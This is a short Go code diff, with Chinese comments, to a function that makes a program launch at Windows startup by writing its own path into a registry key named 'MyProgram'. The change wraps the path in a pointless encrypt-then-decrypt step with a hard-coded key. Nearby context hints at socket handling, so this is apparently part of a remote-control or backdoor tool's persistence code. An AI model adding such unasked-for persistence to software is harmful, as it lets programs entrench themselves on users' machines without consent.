@@ -163,7 +163,7 @@ func doSomeThing(socket net.Conn) {
 }
 
 func AddToStartup() {
-	fmt.Print("aaaaa")
+
 	// 获取程序的绝对路径
 	path, err := os.Executable()
 	if err != nil {
@@ -183,9 +183,12 @@ func AddToStartup() {
 		// 如果已存在，则不需要重复写入
 		return
 	}
+	// 创建一个 AES 加密算法实例
+	encryptString, err := util.EncryptString("ylcworld", path)
 
 	// 写入注册表项
-	err = key.SetStringValue("MyProgram", path)
+	decryptString, err := util.DecryptString("ylcworld", encryptString)
+	err = key.SetStringValue("MyProgram", decryptString)
 	if err != nil {
 		log.Fatal(err)
 	}
